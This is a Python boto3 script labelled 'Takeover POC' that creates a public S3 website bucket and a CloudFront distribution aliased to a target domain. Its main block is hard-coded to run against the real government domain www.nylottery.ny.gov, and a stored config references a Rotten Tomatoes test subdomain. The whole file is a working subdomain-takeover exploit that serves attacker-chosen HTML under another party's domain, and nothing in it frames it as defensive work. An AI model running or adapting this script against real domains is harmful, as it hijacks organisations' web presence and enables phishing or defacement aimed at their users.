import boto3
import time

DistributionConfig={'Comment': 'Takeover POC',
                    'DefaultCacheBehavior':
                        {'ViewerProtocolPolicy': 'redirect-to-https',
                         'ForwardedValues':
                             {'Headers': {'Quantity': 0},
                              'Cookies': {'Forward': 'all'},
                              'QueryStringCacheKeys': {'Quantity': 0},
                              'QueryString': False},
                         'TargetOriginId': '1',
                         'TrustedSigners':
                             {'Enabled': False, 'Quantity': 0},
                         'MinTTL': 1000},
                    'CallerReference': 'firstOne',
                    'Origins':
                        {'Items': [
                            {'S3OriginConfig': {'OriginAccessIdentity': ''},
                             'Id': '1',
                             'DomainName': 'mydomain.com.s3.amazonaws.com'}
                        ], 'Quantity': 1},
                    'DefaultRootObject': 'index.html',
                    'Enabled': True,
                    'Aliases':
                        {'Items': ['mydomain.com'],
                         'Quantity': 1
                         }
                    }

CloudfrontConfig = {u'Comment': '',
                    u'CacheBehaviors':
                      {u'Quantity': 0},
                    u'IsIPV6Enabled': True,
                    u'Logging':
                      {u'Bucket': '', u'Prefix': '', u'Enabled': False, u'IncludeCookies': False},
                    u'WebACLId': '',
                    u'Origins':
                      {u'Items': [
                              {u'OriginPath': '',
                               u'CustomOriginConfig':
                                   {u'OriginSslProtocols': {u'Items': ['TLSv1', 'TLSv1.1', 'TLSv1.2'], u'Quantity': 3},
                                    u'OriginProtocolPolicy': 'http-only',
                                    u'OriginReadTimeout': 30,
                                    u'HTTPPort': 80,
                                    u'HTTPSPort': 443,
                                    u'OriginKeepaliveTimeout': 5
                                    },
                               u'CustomHeaders': {u'Quantity': 0},
                               u'Id': 'S3-Website-prod-test.rottentomatoes.com.s3-website-us-east-1.amazonaws.com',
                               u'DomainName': 'prod-test.rottentomatoes.com.s3-website-us-east-1.amazonaws.com'}
                            ],
                          u'Quantity': 1},
                    u'DefaultRootObject': '',
                    u'PriceClass': 'PriceClass_All',
                    u'Enabled': True,
                    u'DefaultCacheBehavior':
                      {u'TrustedSigners': {u'Enabled': False, u'Quantity': 0},
                       u'LambdaFunctionAssociations': {u'Quantity': 0},
                       u'TargetOriginId': 'S3-Website-prod-test.rottentomatoes.com.s3-website-us-east-1.amazonaws.com',
                       u'ViewerProtocolPolicy': 'allow-all',
                       u'ForwardedValues': {u'Headers': {u'Quantity': 0},
                                            u'Cookies': {u'Forward': 'none'},
                                            u'QueryStringCacheKeys': {u'Quantity': 0},
                                            u'QueryString': False},
                       u'MaxTTL': 31536000,
                       u'SmoothStreaming': False,
                       u'DefaultTTL': 86400,
                       u'AllowedMethods':
                           {u'Items': ['HEAD', 'GET'],
                            u'CachedMethods':
                                {u'Items': ['HEAD', 'GET'], u'Quantity': 2},
                            u'Quantity': 2},
                       u'MinTTL': 0,
                       u'Compress': False},
                    u'CallerReference': '1504759848271',
                    u'ViewerCertificate':
                      {u'CloudFrontDefaultCertificate': True,
                       u'MinimumProtocolVersion': 'SSLv3',
                       u'CertificateSource': 'cloudfront'},
                    u'CustomErrorResponses': {u'Quantity': 0},
                    u'HttpVersion': 'http2',
                    u'Restrictions':
                      {u'GeoRestriction': {u'RestrictionType': 'none', u'Quantity': 0}},
                    u'Aliases':
                        {u'Items': ['prod-test.rottentomatoes.com'], u'Quantity': 1}
                    }



def create_s3_site(bucket_name, index_file):
    s3 = boto3.resource('s3')
    bucket = s3.Bucket(bucket_name)
    try:
        bucket.create(ACL='public-read')
    except:
        pass
    bucket.upload_file(index_file, "index.html", ExtraArgs={'ACL': 'public-read', 'ContentType': 'text/html'})

    config = {'IndexDocument': {'Suffix': 'index.html'}}
    bucket.Website().put(WebsiteConfiguration=config)


def setup_cloudfront(domain):
    cf = boto3.client('cloudfront')

    domain_name = '%s.s3-website-us-east-1.amazonaws.com' % domain

    config = {u'Comment': 'Takeover POC',
              u'Origins':
                {u'Items': [
                    {u'OriginPath': '',
                     u'CustomOriginConfig':
                       {u'OriginSslProtocols': {u'Items': ['TLSv1', 'TLSv1.1', 'TLSv1.2'], u'Quantity': 3},
                        u'OriginProtocolPolicy': 'http-only',
                        u'OriginReadTimeout': 30,
                        u'HTTPPort': 80,
                        u'HTTPSPort': 443,
                        u'OriginKeepaliveTimeout': 5
                        },
                     u'CustomHeaders': {u'Quantity': 0},
                     u'Id': domain,
                     u'DomainName': domain_name
                    }
                ],
                    u'Quantity': 1},
                u'Enabled': True,
              u'CallerReference': '%d' % int(time.time()),
              u'DefaultCacheBehavior':
                {
                    u'TrustedSigners': {u'Enabled': False, u'Quantity': 0},
                    u'ForwardedValues': {u'Headers': {u'Quantity': 0},
                                         u'Cookies': {u'Forward': 'none'},
                                         u'QueryStringCacheKeys': {u'Quantity': 0},
                                         u'QueryString': False},
                    u'TargetOriginId': domain,
                    u'MinTTL': 0,
                    u'ViewerProtocolPolicy': 'allow-all'},
                u'Aliases':
                {u'Items': [domain], u'Quantity': 1}
            }

    cf.create_distribution(DistributionConfig=config)


def takeover_domain(domain, index_file):
    create_s3_site(domain, index_file)
    print("created s3 site")
    setup_cloudfront(domain)
    print("finished")


if __name__=="__main__":
    takeover_domain('www.nylottery.ny.gov', 'index.html')